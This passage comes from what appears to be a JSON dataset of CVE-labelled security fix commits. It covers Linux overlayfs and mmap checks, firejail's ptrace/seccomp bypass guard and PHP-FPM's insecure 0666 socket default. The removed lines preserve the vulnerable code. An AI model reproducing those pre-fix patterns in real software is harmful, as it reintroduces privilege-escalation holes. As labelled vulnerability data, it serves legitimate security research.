(ovl_is_default_permissions(inode)) {\n+\t\tstruct kstat stat;\n+\t\tstruct path realpath = { .dentry = realdentry };\n+\n+\t\tif (mask & MAY_NOT_BLOCK)\n+\t\t\treturn -ECHILD;\n+\n+\t\trealpath.mnt = ovl_entry_mnt_real(oe, inode, is_upper);\n+\n+\t\terr = vfs_getattr(&realpath, &stat);\n+\t\tif (err)\n+\t\t\treturn err;\n+\n+\t\tif ((stat.mode ^ inode->i_mode) & S_IFMT)\n+\t\t\treturn -ESTALE;\n+\n+\t\tinode->i_mode = stat.mode;\n+\t\tinode->i_uid = stat.uid;\n+\t\tinode->i_gid = stat.gid;\n+\n+\t\treturn generic_permission(inode, mask);\n+\t}\n+\n \t\/* Careful in RCU walk mode *\/\n \trealinode = ACCESS_ONCE(realdentry->d_inode);\n \tif (!realinode) {\ndiff --git a\/fs\/overlayfs\/overlayfs.h b\/fs\/overlayfs\/overlayfs.h\nindex ea5a40b06e3a..f3e6efefe40b 100644\n--- a\/fs\/overlayfs\/overlayfs.h\n+++ b\/fs\/overlayfs\/overlayfs.h\n@@ -142,7 +142,10 @@ struct dentry *ovl_dentry_upper(struct dentry *dentry);\n struct dentry *ovl_dentry_lower(struct dentry *dentry);\n struct dentry *ovl_dentry_real(struct dentry *dentry);\n struct dentry *ovl_entry_real(struct ovl_entry *oe, bool *is_upper);\n+struct vfsmount *ovl_entry_mnt_real(struct ovl_entry *oe, struct inode *inode,\n+\t\t\t\t    bool is_upper);\n struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry);\n+bool ovl_is_default_permissions(struct inode *inode);\n void ovl_set_dir_cache(struct dentry *dentry, struct ovl_dir_cache *cache);\n struct dentry *ovl_workdir(struct dentry *dentry);\n int ovl_want_write(struct dentry *dentry);\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 8d04b86e0680..97cacb525974 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -30,6 +30,7 @@ struct ovl_config {\n \tchar *lowerdir;\n \tchar *upperdir;\n \tchar *workdir;\n+\tbool default_permissions;\n };\n \n \/* private information held for overlayfs's superblock *\/\n@@ -154,6 +155,18 @@ struct dentry *ovl_entry_real(struct ovl_entry *oe, bool *is_upper)\n \treturn realdentry;\n }\n \n+struct vfsmount *ovl_entry_mnt_real(struct ovl_entry *oe, struct inode *inode,\n+\t\t\t\t    bool is_upper)\n+{\n+\tif (is_upper) {\n+\t\tstruct ovl_fs *ofs = inode->i_sb->s_fs_info;\n+\n+\t\treturn ofs->upper_mnt;\n+\t} else {\n+\t\treturn oe->numlower ? oe->lowerstack[0].mnt : NULL;\n+\t}\n+}\n+\n struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry)\n {\n \tstruct ovl_entry *oe = dentry->d_fsdata;\n@@ -161,6 +174,13 @@ struct ovl_dir_cache *ovl_dir_cache(struct dentry *dentry)\n \treturn oe->cache;\n }\n \n+bool ovl_is_default_permissions(struct inode *inode)\n+{\n+\tstruct ovl_fs *ofs = inode->i_sb->s_fs_info;\n+\n+\treturn ofs->config.default_permissions;\n+}\n+\n void ovl_set_dir_cache(struct dentry *dentry, struct ovl_dir_cache *cache)\n {\n \tstruct ovl_entry *oe = dentry->d_fsdata;\n@@ -594,6 +614,8 @@ static int ovl_show_options(struct seq_file *m, struct dentry *dentry)\n \t\tseq_printf(m, \",upperdir=%s\", ufs->config.upperdir);\n \t\tseq_printf(m, \",workdir=%s\", ufs->config.workdir);\n \t}\n+\tif (ufs->config.default_permissions)\n+\t\tseq_puts(m, \",default_permissions\");\n \treturn 0;\n }\n \n@@ -618,6 +640,7 @@ enum {\n \tOPT_LOWERDIR,\n \tOPT_UPPERDIR,\n \tOPT_WORKDIR,\n+\tOPT_DEFAULT_PERMISSIONS,\n \tOPT_ERR,\n };\n \n@@ -625,6 +648,7 @@ static const match_table_t ovl_tokens = {\n \t{OPT_LOWERDIR,\t\t\t\"lowerdir=%s\"},\n \t{OPT_UPPERDIR,\t\t\t\"upperdir=%s\"},\n \t{OPT_WORKDIR,\t\t\t\"workdir=%s\"},\n+\t{OPT_DEFAULT_PERMISSIONS,\t\"default_permissions\"},\n \t{OPT_ERR,\t\t\tNULL}\n };\n \n@@ -685,6 +709,10 @@ static int ovl_parse_opt(char *opt, struct ovl_config *config)\n \t\t\t\treturn -ENOMEM;\n \t\t\tbreak;\n \n+\t\tcase OPT_DEFAULT_PERMISSIONS:\n+\t\t\tconfig->default_permissions = true;\n+\t\t\tbreak;\n+\n \t\tdefault:\n \t\t\tpr_err(\"overlayfs: unrecognized mount option \\\"%s\\\" or missing value\\n\", p);\n \t\t\treturn -EINVAL;\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/copy_up.c b\/fs\/overlayfs\/copy_up.c\nindex 871fcb67be97..394e87f8340f 100644\n--- a\/fs\/overlayfs\/copy_up.c\n+++ b\/fs\/overlayfs\/copy_up.c\n@@ -54,7 +54,7 @@ int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n \n \tfor (name = buf; name < (buf + list_size); name += strlen(name) + 1) {\n \t\tsize = vfs_getxattr(old, name, value, XATTR_SIZE_MAX);\n-\t\tif (size <= 0) {\n+\t\tif (size < 0) {\n \t\t\terror = size;\n \t\t\tgoto out_free_value;\n \t\t}\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/copy_up.c b\/fs\/overlayfs\/copy_up.c\nindex 394e87f8340f..758012bfd5f0 100644\n--- a\/fs\/overlayfs\/copy_up.c\n+++ b\/fs\/overlayfs\/copy_up.c\n@@ -22,9 +22,9 @@\n \n int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n {\n-\tssize_t list_size, size;\n-\tchar *buf, *name, *value;\n-\tint error;\n+\tssize_t list_size, size, value_size = 0;\n+\tchar *buf, *name, *value = NULL;\n+\tint uninitialized_var(error);\n \n \tif (!old->d_inode->i_op->getxattr ||\n \t    !new->d_inode->i_op->getxattr)\n@@ -41,29 +41,40 @@ int ovl_copy_xattr(struct dentry *old, struct dentry *new)\n \tif (!buf)\n \t\treturn -ENOMEM;\n \n-\terror = -ENOMEM;\n-\tvalue = kmalloc(XATTR_SIZE_MAX, GFP_KERNEL);\n-\tif (!value)\n-\t\tgoto out;\n-\n \tlist_size = vfs_listxattr(old, buf, list_size);\n \tif (list_size <= 0) {\n \t\terror = list_size;\n-\t\tgoto out_free_value;\n+\t\tgoto out;\n \t}\n \n \tfor (name = buf; name < (buf + list_size); name += strlen(name) + 1) {\n-\t\tsize = vfs_getxattr(old, name, value, XATTR_SIZE_MAX);\n+retry:\n+\t\tsize = vfs_getxattr(old, name, value, value_size);\n+\t\tif (size == -ERANGE)\n+\t\t\tsize = vfs_getxattr(old, name, NULL, 0);\n+\n \t\tif (size < 0) {\n \t\t\terror = size;\n-\t\t\tgoto out_free_value;\n+\t\t\tbreak;\n+\t\t}\n+\n+\t\tif (size > value_size) {\n+\t\t\tvoid *new;\n+\n+\t\t\tnew = krealloc(value, size, GFP_KERNEL);\n+\t\t\tif (!new) {\n+\t\t\t\terror = -ENOMEM;\n+\t\t\t\tbreak;\n+\t\t\t}\n+\t\t\tvalue = new;\n+\t\t\tvalue_size = size;\n+\t\t\tgoto retry;\n \t\t}\n+\n \t\terror = vfs_setxattr(new, name, value, size, 0);\n \t\tif (error)\n-\t\t\tgoto out_free_value;\n+\t\t\tbreak;\n \t}\n-\n-out_free_value:\n \tkfree(value);\n out:\n \tkfree(buf);\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 97cacb525974..32f31243d36a 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -24,8 +24,6 @@ MODULE_AUTHOR(\"Miklos Szeredi <miklos@szeredi.hu>\");\n MODULE_DESCRIPTION(\"Overlay filesystem\");\n MODULE_LICENSE(\"GPL\");\n \n-#define OVERLAYFS_SUPER_MAGIC 0x794c7630\n-\n struct ovl_config {\n \tchar *lowerdir;\n \tchar *upperdir;\ndiff --git a\/include\/uapi\/linux\/magic.h b\/include\/uapi\/linux\/magic.h\nindex 7b1425a6b370..eec438952aa7 100644\n--- a\/include\/uapi\/linux\/magic.h\n+++ b\/include\/uapi\/linux\/magic.h\n@@ -31,6 +31,7 @@\n #define PSTOREFS_MAGIC\t\t0x6165676C\n #define EFIVARFS_MAGIC\t\t0xde5e81e4\n #define HOSTFS_SUPER_MAGIC\t0x00c0ffee\n+#define OVERLAYFS_SUPER_MAGIC\t0x794c7630\n \n #define MINIX_SUPER_MAGIC\t0x137F\t\t\/* minix v1 fs, 14 char names *\/\n #define MINIX_SUPER_MAGIC2\t0x138F\t\t\/* minix v1 fs, 30 char names *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex 32f31243d36a..ec31711d4886 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -1079,6 +1079,9 @@ static int ovl_fill_super(struct super_block *sb, void *data, int silent)\n \n \troot_dentry->d_fsdata = oe;\n \n+\tovl_copyattr(ovl_dentry_real(root_dentry)->d_inode,\n+\t\t     root_dentry->d_inode);\n+\n \tsb->s_magic = OVERLAYFS_SUPER_MAGIC;\n \tsb->s_op = &ovl_super_operations;\n \tsb->s_root = root_dentry;\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex 76546314e35f..213a726cff96 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -45,6 +45,19 @@ int ovl_setattr(struct dentry *dentry, struct iattr *attr)\n \tint err;\n \tstruct dentry *upperdentry;\n \n+\t\/*\n+\t * Check for permissions before trying to copy-up.  This is redundant\n+\t * since it will be rechecked later by ->setattr() on upper dentry.  But\n+\t * without this, copy-up can be triggered by just about anybody.\n+\t *\n+\t * We don't initialize inode->size, which just means that\n+\t * inode_newsize_ok() will always check against MAX_LFS_FILESIZE and not\n+\t * check for a swapfile (which this won't be anyway).\n+\t *\/\n+\terr = inode_change_ok(dentry->d_inode, attr);\n+\tif (err)\n+\t\treturn err;\n+\n \terr = ovl_want_write(dentry);\n \tif (err)\n \t\tgoto out;\ndiff --git a\/fs\/overlayfs\/super.c b\/fs\/overlayfs\/super.c\nindex ec31711d4886..b08bf4d3a405 100644\n--- a\/fs\/overlayfs\/super.c\n+++ b\/fs\/overlayfs\/super.c\n@@ -9,6 +9,7 @@\n \n #include <linux\/fs.h>\n #include <linux\/namei.h>\n+#include <linux\/pagemap.h>\n #include <linux\/xattr.h>\n #include <linux\/security.h>\n #include <linux\/mount.h>\n@@ -936,6 +937,7 @@ static int ovl_fill_super(struct super_block *sb, void *data, int silent)\n \t}\n \n \tsb->s_stack_depth = 0;\n+\tsb->s_maxbytes = MAX_LFS_FILESIZE;\n \tif (ufs->config.upperdir) {\n \t\tif (!ufs->config.workdir) {\n \t\t\tpr_err(\"overlayfs: missing 'workdir'\\n\");\n-- \ncgit 1.2-0.3.lf.el7\n\n\ndiff --git a\/fs\/overlayfs\/readdir.c b\/fs\/overlayfs\/readdir.c\nindex 70e9af551600..adcb1398c481 100644\n--- a\/fs\/overlayfs\/readdir.c\n+++ b\/fs\/overlayfs\/readdir.c\n@@ -571,7 +571,8 @@ void ovl_cleanup_whiteouts(struct dentry *upper, struct list_head *list)\n \t\t\t       (int) PTR_ERR(dentry));\n \t\t\tcontinue;\n \t\t}\n-\t\tovl_cleanup(upper->d_inode, dentry);\n+\t\tif (dentry->d_inode)\n+\t\t\tovl_cleanup(upper->d_inode, dentry);\n \t\tdput(dentry);\n \t}\n \tmutex_unlock(&upper->d_inode->i_mutex);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"9206de95b1ea68357996ec02be5db0638a0de2c1","commit_message":"From 9206de95b1ea68357996ec02be5db0638a0de2c1 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Thu, 3 Dec 2009 15:23:11 -0500\nSubject: Take arch_mmap_check() into get_unmapped_area()\n\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mmap.c   | 14 +++++++++-----\n mm\/mremap.c | 15 +++------------\n 2 files changed, 12 insertions(+), 17 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mmap.c b\/mm\/mmap.c\nindex 5076775a395c..c04146da8efd 100644\n--- a\/mm\/mmap.c\n+++ b\/mm\/mmap.c\n@@ -931,13 +931,9 @@ unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,\n \tif (!(flags & MAP_FIXED))\n \t\taddr = round_hint_to_min(addr);\n \n-\terror = arch_mmap_check(addr, len, flags);\n-\tif (error)\n-\t\treturn error;\n-\n \t\/* Careful about overflows.. *\/\n \tlen = PAGE_ALIGN(len);\n-\tif (!len || len > TASK_SIZE)\n+\tif (!len)\n \t\treturn -ENOMEM;\n \n \t\/* offset overflow? *\/\n@@ -1437,6 +1433,14 @@ get_unmapped_area(struct file *file, unsigned long addr, unsigned long len,\n \tunsigned long (*get_area)(struct file *, unsigned long,\n \t\t\t\t  unsigned long, unsigned long, unsigned long);\n \n+\tunsigned long error = arch_mmap_check(addr, len, flags);\n+\tif (error)\n+\t\treturn error;\n+\n+\t\/* Careful about overflows.. *\/\n+\tif (len > TASK_SIZE)\n+\t\treturn -ENOMEM;\n+\n \tget_area = current->mm->get_unmapped_area;\n \tif (file && file->f_op && file->f_op->get_unmapped_area)\n \t\tget_area = file->f_op->get_unmapped_area;\ndiff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex bbbbbf507ff3..845190898d59 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -27,10 +27,6 @@\n \n #include \"internal.h\"\n \n-#ifndef arch_mmap_check\n-#define arch_mmap_check(addr, len, flags)\t(0)\n-#endif\n-\n static pmd_t *get_old_pmd(struct mm_struct *mm, unsigned long addr)\n {\n \tpgd_t *pgd;\n@@ -366,9 +362,7 @@ static unsigned long mremap_to(unsigned long addr,\n \tmap_flags = MAP_FIXED;\n \tif (vma->vm_flags & VM_MAYSHARE)\n \t\tmap_flags |= MAP_SHARED;\n-\tret = arch_mmap_check(new_addr, new_len, map_flags);\n-\tif (ret)\n-\t\tgoto out1;\n+\n \tret = get_unmapped_area(vma->vm_file, new_addr, new_len, vma->vm_pgoff +\n \t\t\t\t((addr - vma->vm_start) >> PAGE_SHIFT),\n \t\t\t\tmap_flags);\n@@ -388,12 +382,9 @@ out:\n static int vma_expandable(struct vm_area_struct *vma, unsigned long delta)\n {\n \tunsigned long end = vma->vm_end + delta;\n-\tunsigned long max_addr = TASK_SIZE;\n-\tif (vma->vm_next)\n-\t\tmax_addr = vma->vm_next->vm_start;\n-\tif (max_addr < end || end < vma->vm_end)\n+\tif (end < vma->vm_end) \/* overflow *\/\n \t\treturn 0;\n-\tif (arch_mmap_check(vma->vm_start, end - vma->vm_start, MAP_FIXED))\n+\tif (vma->vm_next && vma->vm_next->vm_start < end) \/* intersection *\/\n \t\treturn 0;\n \tif (get_unmapped_area(NULL, vma->vm_start, end - vma->vm_start,\n \t\t\t      0, MAP_FIXED) & ~PAGE_MASK)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"05d72faa6d13c9d857478a5d35c85db9adada685","commit_message":"From 05d72faa6d13c9d857478a5d35c85db9adada685 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Thu, 3 Dec 2009 19:51:02 -0500\nSubject: sparc_brk() is not needed anymore\n\nthe checks it's doing are duplicated in sys_brk() and failing\nthem early makes no sense, AFAICT.\n\nAcked-by: David S. Miller <davem@davemloft.net>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/sparc\/kernel\/sys_sparc_32.c |  9 ---------\n arch\/sparc\/kernel\/sys_sparc_64.c | 12 ------------\n arch\/sparc\/kernel\/systbls.h      |  1 -\n arch\/sparc\/kernel\/systbls_32.S   |  2 +-\n arch\/sparc\/kernel\/systbls_64.S   |  4 ++--\n 5 files changed, 3 insertions(+), 25 deletions(-)\n\n","diff_code":"diff --git a\/arch\/sparc\/kernel\/sys_sparc_32.c b\/arch\/sparc\/kernel\/sys_sparc_32.c\nindex 36f6f26d9cec..997bdd0d3d70 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_32.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_32.c\n@@ -79,15 +79,6 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr, unsi\n \t}\n }\n \n-asmlinkage unsigned long sparc_brk(unsigned long brk)\n-{\n-\tif(ARCH_SUN4C) {\n-\t\tif ((brk & 0xe0000000) != (current->mm->brk & 0xe0000000))\n-\t\t\treturn current->mm->brk;\n-\t}\n-\treturn sys_brk(brk);\n-}\n-\n \/*\n  * sys_pipe() is the normal C calling standard for creating\n  * a pipe. It's not the way unix traditionally does this, though.\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_64.c b\/arch\/sparc\/kernel\/sys_sparc_64.c\nindex 8f9cd58497de..cfa0e19abe3b 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_64.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_64.c\n@@ -403,18 +403,6 @@ void arch_pick_mmap_layout(struct mm_struct *mm)\n \t}\n }\n \n-SYSCALL_DEFINE1(sparc_brk, unsigned long, brk)\n-{\n-\t\/* People could try to be nasty and use ta 0x6d in 32bit programs *\/\n-\tif (test_thread_flag(TIF_32BIT) && brk >= STACK_TOP32)\n-\t\treturn current->mm->brk;\n-\n-\tif (unlikely(straddles_64bit_va_hole(current->mm->brk, brk)))\n-\t\treturn current->mm->brk;\n-\n-\treturn sys_brk(brk);\n-}\n-                                                                \n \/*\n  * sys_pipe() is the normal C calling standard for creating\n  * a pipe. It's not the way unix traditionally does this, though.\ndiff --git a\/arch\/sparc\/kernel\/systbls.h b\/arch\/sparc\/kernel\/systbls.h\nindex a63c5d2d9849..d2f999ae2b85 100644\n--- a\/arch\/sparc\/kernel\/systbls.h\n+++ b\/arch\/sparc\/kernel\/systbls.h\n@@ -9,7 +9,6 @@\n struct new_utsname;\n \n extern asmlinkage unsigned long sys_getpagesize(void);\n-extern asmlinkage unsigned long sparc_brk(unsigned long brk);\n extern asmlinkage long sparc_pipe(struct pt_regs *regs);\n extern asmlinkage long sys_ipc(unsigned int call, int first,\n \t\t\t       unsigned long second,\ndiff --git a\/arch\/sparc\/kernel\/systbls_32.S b\/arch\/sparc\/kernel\/systbls_32.S\nindex 3a66765ade58..801fc8e5a0e8 100644\n--- a\/arch\/sparc\/kernel\/systbls_32.S\n+++ b\/arch\/sparc\/kernel\/systbls_32.S\n@@ -19,7 +19,7 @@ sys_call_table:\n \/*0*\/\t.long sys_restart_syscall, sys_exit, sys_fork, sys_read, sys_write\n \/*5*\/\t.long sys_open, sys_close, sys_wait4, sys_creat, sys_link\n \/*10*\/  .long sys_unlink, sunos_execv, sys_chdir, sys_chown16, sys_mknod\n-\/*15*\/\t.long sys_chmod, sys_lchown16, sparc_brk, sys_nis_syscall, sys_lseek\n+\/*15*\/\t.long sys_chmod, sys_lchown16, sys_brk, sys_nis_syscall, sys_lseek\n \/*20*\/\t.long sys_getpid, sys_capget, sys_capset, sys_setuid16, sys_getuid16\n \/*25*\/\t.long sys_vmsplice, sys_ptrace, sys_alarm, sys_sigaltstack, sys_pause\n \/*30*\/\t.long sys_utime, sys_lchown, sys_fchown, sys_access, sys_nice\ndiff --git a\/arch\/sparc\/kernel\/systbls_64.S b\/arch\/sparc\/kernel\/systbls_64.S\nindex 0648a087810a..e575b46bd7a9 100644\n--- a\/arch\/sparc\/kernel\/systbls_64.S\n+++ b\/arch\/sparc\/kernel\/systbls_64.S\n@@ -21,7 +21,7 @@ sys_call_table32:\n \/*0*\/\t.word sys_restart_syscall, sys32_exit, sys_fork, sys_read, sys_write\n \/*5*\/\t.word sys32_open, sys_close, sys32_wait4, sys32_creat, sys_link\n \/*10*\/  .word sys_unlink, sunos_execv, sys_chdir, sys_chown16, sys32_mknod\n-\/*15*\/\t.word sys_chmod, sys_lchown16, sys_sparc_brk, sys32_perfctr, sys32_lseek\n+\/*15*\/\t.word sys_chmod, sys_lchown16, sys_brk, sys32_perfctr, sys32_lseek\n \/*20*\/\t.word sys_getpid, sys_capget, sys_capset, sys_setuid16, sys_getuid16\n \/*25*\/\t.word sys32_vmsplice, compat_sys_ptrace, sys_alarm, sys32_sigaltstack, sys_pause\n \/*30*\/\t.word compat_sys_utime, sys_lchown, sys_fchown, sys32_access, sys32_nice\n@@ -96,7 +96,7 @@ sys_call_table:\n \/*0*\/\t.word sys_restart_syscall, sparc_exit, sys_fork, sys_read, sys_write\n \/*5*\/\t.word sys_open, sys_close, sys_wait4, sys_creat, sys_link\n \/*10*\/  .word sys_unlink, sys_nis_syscall, sys_chdir, sys_chown, sys_mknod\n-\/*15*\/\t.word sys_chmod, sys_lchown, sys_sparc_brk, sys_perfctr, sys_lseek\n+\/*15*\/\t.word sys_chmod, sys_lchown, sys_brk, sys_perfctr, sys_lseek\n \/*20*\/\t.word sys_getpid, sys_capget, sys_capset, sys_setuid, sys_getuid\n \/*25*\/\t.word sys_vmsplice, sys_ptrace, sys_alarm, sys_sigaltstack, sys_nis_syscall\n \/*30*\/\t.word sys_utime, sys_nis_syscall, sys_nis_syscall, sys_access, sys_nice\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-5206","CWE_ID":"264","category":"security","commit_id":"6b8dba29d73257311564ee7f27b9b14758cc693e","commit_message":"From 6b8dba29d73257311564ee7f27b9b14758cc693e Mon Sep 17 00:00:00 2001\nFrom: netblue30 <netblue30@yahoo.com>\nDate: Fri, 6 Jan 2017 16:03:54 -0500\nSubject: [PATCH] security fix\n\n---\n RELNOTES             |  3 +++\n src\/firejail\/main.c  | 19 +++++++++++++++++++\n src\/man\/firejail.txt |  4 +++-\n 3 files changed, 25 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/RELNOTES b\/RELNOTES\nindex 6aaebefc3..36da0100f 100644\n--- a\/RELNOTES\n+++ b\/RELNOTES\n@@ -1,5 +1,8 @@\n firejail (0.9.44.3) baseline; urgency=low\n   * development version\n+  * security: disabled --allow-debuggers when running on kernel\n+    versions prior to 4.8; a kernel bug in ptrace system call\n+    allows a full bypass of seccomp filter; problem reported by Lizzie Dixon\n   * security: root exploit found by Sebastian Krahmer\n  -- netblue30 <netblue30@yahoo.com>  Wed, 4 Jan 2017 11:00:00 -0500\n \ndiff --git a\/src\/firejail\/main.c b\/src\/firejail\/main.c\nindex e501d92e8..e67290911 100644\n--- a\/src\/firejail\/main.c\n+++ b\/src\/firejail\/main.c\n@@ -35,6 +35,7 @@\n #include <signal.h>\n #include <time.h>\n #include <net\/if.h>\n+#include <sys\/utsname.h>\n \n #if 0\n #include <sys\/times.h>\n@@ -802,6 +803,24 @@ static void detect_allow_debuggers(int argc, char **argv) {\n \t\/\/ detect --allow-debuggers\n \tfor (i = 1; i < argc; i++) {\n \t\tif (strcmp(argv[i], \"--allow-debuggers\") == 0) {\n+\t\t\t\/\/ check kernel version\n+\t\t\tstruct utsname u;\n+\t\t\tint rv = uname(&u);\n+\t\t\tif (rv != 0)\n+\t\t\t\terrExit(\"uname\");\n+\t\t\tint major;\n+\t\t\tint minor;\n+\t\t\tif (2 != sscanf(u.release, \"%d.%d\", &major, &minor)) {\n+\t\t\t\tfprintf(stderr, \"Error: cannot extract Linux kernel version: %s\\n\", u.version);\n+\t\t\t\texit(1);\n+\t\t\t}\n+\t\t\tif (major < 4 || (major == 4 && minor < 8)) {\n+\t\t\t\tfprintf(stderr, \"Error: --allow-debuggers is disabled on Linux kernels prior to 4.8. \"\n+\t\t\t\t\t\"A bug in ptrace call allows a full bypass of the seccomp filter. \"\n+\t\t\t\t\t\"Your current kernel version is %d.%d.\\n\", major, minor);\n+\t\t\t\texit(1);\n+\t\t\t}\n+\t\t\t\n \t\t\targ_allow_debuggers = 1;\n \t\t\tbreak;\n \t\t}\ndiff --git a\/src\/man\/firejail.txt b\/src\/man\/firejail.txt\nindex 8cc766200..332f510c6 100644\n--- a\/src\/man\/firejail.txt\n+++ b\/src\/man\/firejail.txt\n@@ -76,7 +76,9 @@ $ firejail [OPTIONS] firefox        # starting Mozilla Firefox\n Signal the end of options and disables further option processing.\n .TP\n \\fB\\-\\-allow-debuggers\n-Allow tools such as strace and gdb inside the sandbox.\n+Allow tools such as strace and gdb inside the sandbox. This option is only available\n+when running on Linux kernels 4.8 or newer - a kernel bug in ptrace system call allows a full\n+bypass of the seccomp filter.\n .br\n \n .br\n","owner":"netblue30","repo":"firejail","source":"cve"},{"CVE_ID":"CVE-2014-0185","CWE_ID":"264","category":"security","commit_id":"35ceea928b12373a3b1e3eecdc32ed323223a40d","commit_message":"From 35ceea928b12373a3b1e3eecdc32ed323223a40d Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Tue, 15 Apr 2014 10:43:24 -0700\nSubject: [PATCH] Fix bug #67060: use default mode of 660\n\n---\n NEWS                     | 4 +++-\n sapi\/fpm\/fpm\/fpm_unix.c  | 2 +-\n sapi\/fpm\/php-fpm.conf.in | 4 ++--\n 3 files changed, 6 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 387d070c028e..104279441a7f 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -25,7 +25,7 @@ PHP                                                                        NEWS\n   . Fix bug #64498 ($phar->buildFromDirectory can't compress file with an accent \n     in its name). (PR #588) \n \n-?? ??? 2014, PHP 5.4.28\n+01 May 2014, PHP 5.4.28\n \n - Core:\n   . Fixed bug #61019 (Out of memory on command stream_get_contents). (Mike)\n@@ -55,6 +55,8 @@ PHP                                                                        NEWS\n \n - FPM:\n   . Fixed bug #66482 (unknown entry 'priority' in php-fpm.conf). \n+  . Fixed bug #67060 (sapi\/fpm: possible privilege escalation due to insecure \n+    default configuration) (CVE-2014-0185). (Stas)\n \n - JSON:\n   . Fixed bug #66021 (Blank line inside empty array\/object when\ndiff --git a\/sapi\/fpm\/fpm\/fpm_unix.c b\/sapi\/fpm\/fpm\/fpm_unix.c\nindex 48249e8a4948..ea0e67369cd5 100644\n--- a\/sapi\/fpm\/fpm\/fpm_unix.c\n+++ b\/sapi\/fpm\/fpm\/fpm_unix.c\n@@ -35,7 +35,7 @@ int fpm_unix_resolve_socket_premissions(struct fpm_worker_pool_s *wp) \/* {{{ *\/\n \t\/* uninitialized *\/\n \twp->socket_uid = -1;\n \twp->socket_gid = -1;\n-\twp->socket_mode = 0666;\n+\twp->socket_mode = 0660;\n \n \tif (!c) {\n \t\treturn 0;\ndiff --git a\/sapi\/fpm\/php-fpm.conf.in b\/sapi\/fpm\/php-fpm.conf.in\nindex 1e70f2c1c1e0..9205d422399b 100644\n--- a\/sapi\/fpm\/php-fpm.conf.in\n+++ b\/sapi\/fpm\/php-fpm.conf.in\n@@ -166,10 +166,10 @@ listen = 127.0.0.1:9000\n ; permissions must be set in order to allow connections from a web server. Many\n ; BSD-derived systems allow connections regardless of permissions. \n ; Default Values: user and group are set as the running user\n-;                 mode is set to 0666\n+;                 mode is set to 0660\n ;listen.owner = @php_fpm_user@\n ;listen.group = @php_fpm_group@\n-;listen.mode = 0666\n+;listen.mode = 0660\n  \n ; List of ipv4 addresses of FastCGI clients which are allowed to connect.\n ; Equivalent to the FCGI_WEB_SERVER_ADDRS environment variable in the original\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2009-1337","CWE_ID":"264","category":"security","commit_id":"432870dab85a2f69dc417022646cb9a70acf7f94","commit_message":"From 432870dab85a2f69dc417022646cb9a70acf7f94 Mon Sep 17 00:00:00 2001\nFrom: Oleg Nesterov <oleg@redhat.com>\nDate: Mon, 6 Apr 2009 16:16:02 +0200\nSubject: exit_notify: kill the wrong capable(CAP_KILL) check\n\nThe CAP_KILL check in exit_notify() looks just wrong, kill it.\n\nWhatever logic we have to reset ->exit_signal, the malicious user\ncan bypass it if it execs the setuid application before exiting.\n\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: Serge Hallyn <serue@us.ibm.com>\nAcked-by: Roland McGrath <roland@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/exit.c | 3 +--\n 1 file changed, 1 insertion(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/exit.c b\/kernel\/exit.c\nindex 6686ed1e4aa3..32cbf2607cb0 100644\n--- a\/kernel\/exit.c\n+++ b\/kernel\/exit.c\n@@ -837,8 +837,7 @@ static void exit_notify(struct task_struct *tsk, int group_dead)\n \t *\/\n \tif (tsk->exit_signal != SIGCHLD && !task_detached(tsk) &&\n \t    (tsk->parent_exec_id != tsk->real_parent->self_exec_id ||\n-\t     tsk->self_exec_id != tsk->parent_exec_id) &&\n-\t    